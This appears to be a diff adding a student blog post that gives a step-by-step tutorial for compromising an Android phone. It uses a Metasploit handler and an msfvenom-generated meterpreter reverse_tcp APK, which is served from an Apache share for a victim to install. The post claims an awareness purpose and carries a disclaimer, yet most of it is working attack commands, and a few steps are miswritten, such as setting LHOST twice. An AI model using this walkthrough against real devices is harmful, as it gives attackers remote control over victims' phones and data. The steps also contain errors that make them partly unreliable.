@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>Post</title>
+        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v5.15.3/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+        <link href="css/paraiso-dark.css" rel="stylesheet" type="text/css">
+        <!-- Floating Button here-->
+        <style>
+            .floatingButton {
+                background-color: #F44336;
+                width: 60px;
+                height: 60px;
+                border-radius: 100%;
+                background: #008346;
+                border: none;
+                outline: none;
+                color: #FFF;
+                font-size: 36px;
+                box-shadow: 0 3px 6px rgba(0, 0, 0, 0.16), 0 3px 6px rgba(0, 0, 0, 0.23);
+                position: fixed;
+                left: 20px;
+                bottom: 20px;
+                transition: .3s;
+                -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+            }
+        </style>
+        <button class="floatingButton" onclick="location.href = '#top'">↑</button>
+    </head>
+    <body>
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <a class="navbar-brand" href="index.html">J&A Blog</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.html">Home</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="about.html">About</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="contact.html">Contact</a></li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <!-- Page Header-->
+        <header class="masthead" style="background-image: url('assets/img/post-bg-1.jpg')">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="post-heading">
+                            <h1>Android exploit using SMS</h1>
+                            <h2 class="subheading">Social engineering + SMSs = DANGER!</h2>
+                            <span class="meta">
+                                Posted by
+                                <a href="https://github.com/AM-ops">Affaan Muhammad</a>
+                                on October 19, 2021 <br> Read Time: ± 10min
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- Post Content-->
+        <article class="mb-4">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <h2>Worldwide Mobile Operating Systems Market Share</h2>
+                        
+                        <h2>African Mobile Operating Systems Market Share</h2>
+                        
+                        <p>Looking at the graphs above my reaction is:</p>
+                        <p><img src="assets/img/umm.gif" class="img-fluid mx-auto d-block" alt="umm"/></p>
+                        <h2>From the Situation Room</h2>
+                        <p>It would be not a long shot to assume that you do own a Mobile device, and you are currently using it to view this blog.</p>
+                        <p>How often have you received a SMS that seemed off, or was something that you would not expect?</p>
+                        <p>Often times SMSs can have malicious links embedded in them, or can contain spam which might compromise your device.</p>
+                        <p>Clicking on such links or installing unknown apps on your device, you might feel like doing this!</p>
+                        <p><img src="assets/img/broken-phone.gif" class="img-fluid mx-auto d-block" alt="break"/></p>
+                        <h2>Onward to the exploit!</h2>
+                        <p>Now on to the actual HACKING!</p>
+                        <p><b style="color: red;">DISCLAIMER:</b> DO NOT TRY THIS AT HOME OR ON PUBLIC NETWORKS!</p>
+                        <p><img src="assets/img/ww.gif" class="img-fluid mx-auto d-block" alt="ww"/></p>
+                        <h4>Step 1:</h4>
+                        <p>Fire up the Metasploit console by running this command on your Kali Linux VM's terminal</p>
+                        <pre><code data-language="shell">msfconsole</code></pre>
+                        <p>Your terminal should now look something like this</p>
+                        <p><img src="assets/post1pics/msf.PNG" class="img-fluid mx-auto d-block" alt="ww"/></p>
+                        <h4>Step 2:</h4>
+                        <p>Your terminal should have "msf6" as its prompt now. This means you can begin to use Metasploit commands. Type the command below.</p>
+                        <pre><code data-language="shell">msf6> use exploit/multi/handler</code></pre>
+                        <p>This command </p>
+                        <p><img src="assets/post1pics/msf2.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <h4>Step 3:</h4>
+                        <pre><code data-language="shell">msf6> search android/meterpreter</code></pre>
+                        <h4>Step 4:</h4>
+                        <pre><code data-language="shell">msf6> set payload android/meterpreter/reverse_tcp</code></pre>
+                        <h4>Step 5:</h4>
+                        <pre><code data-language="shell">msf6> show options</code></pre>
+                        <h4>Step 6:</h4>
+                        <pre><code data-language="shell">msf6> set LHOST ip_address</code></pre>
+                        <h4>Step 7:</h4>
+                        <pre><code data-language="shell">msf6> set LHOST port_number</code></pre>
+                        <h4>Step 8:</h4>
+                        <pre><code data-language="shell">msf6> exploit</code></pre>
+                        <p>This command begins the exploit and the <i>Listener</i> begins to "listen" for incoming requests sent by the victim's Android device.</p>
+                        <h4>Step 9:</h4>
+                        <p>In a new terminal start up the Metasploit console once again, and input the following command</p>
+                        <pre><code data-language="shell">msf6> msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /var/www/html/share/filename.apk</code></pre>
+                        <p>This command is used to create the malicious payload for the Android device. The APK file is saved to the share folder of the Apache server on our Kali Linux VM. A screenshot is show below.</p>
+                        <p><img src="assets/post1pics/msf3.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>If you see how small this file is, then this should be a red flag for you as a victim in the future.</p>
+                        <p>You should feel like this if you do come across such a file in the wild.</p>
+                        <p><img src="assets/post1pics/sweating-wet.gif" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>The malicious APK can now be accessed on the Android device and installed. To do this, run the following command below.</p>
+                        <pre><code>service apache2 start</code></pre>
+                        <p>Accessing the following link on the Android device's browser will open up the share folder.</p>
+                        <pre><code>10.0.2.15/share/</code></pre>
+                        <p>This is shown below.</p>
+                        <img src="assets/post1pics/msf4.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <p>Once the victim downloads the file and opens it, they will see the following installation screen.</p>
+                        <img src="assets/post1pics/msf5.PNG" class="img-fluid mx-auto d-block" alt=""/>
+                        <p>If the malicious file is installed, it is game over!</p>
+                        <p>The hacker is going to be like</p>
+                        <p><img src="assets/post1pics/thumbs-up-hacker.gif" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>From here on the hacker will have full control of the Android device. A list of commands can be accessed for meterpreter by typing the following command</p>
+                        <pre><code>meterpreter --help</code></pre>
+                        <p>A screenshot is shown below</p>
+                        <p><img src="assets/post1pics/msf6.PNG" class="img-fluid mx-auto d-block" alt=""/></p>
+                        <p>A more comprehensive list of commands is shown below which was taken from the documentation of Metasploit</p>
+                        <iframe src="assets/commands.txt" frameborder="2" width="110%"></iframe>
+                        <p>
+                        <blockquote class="blockquote">"We're always chasing the bad guys – the good guys are never ahead. We're not the ones who wrote these exploits. They are often found in the wild and the defenders are generally following the black hats."<br/> - H. D. Moore, Network Security Expert, Founder of the Metasploit Project</blockquote>
+                        </p>
+                        <p>
+                            Sources:
+                            &middot; GIFs by
+                            <a href="https://tenor.com/">Tenor</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </article>
+        <!-- Footer-->
+        <footer class="border-top">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <ul class="list-inline text-center">
+                            <li class="list-inline-item">
+                                <a href="https://github.com/Josh-SCG">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span><br>
+                                    Josh-SCG
+                                </a>
+                            </li>
+                            
+                            <li class="list-inline-item">
+                                <a href="https://github.com/AM-ops">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span><br>
+                                    AM-ops
+                                </a>
+                            </li>
+                        </ul>
+                        <div class="small text-center text-muted fst-italic">&bull; Copyright &copy; ITRI625 Project 2021 &bull;</div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+        <script src="js/rainbow-custom.min.js"></script>
+    </body>
+</html>
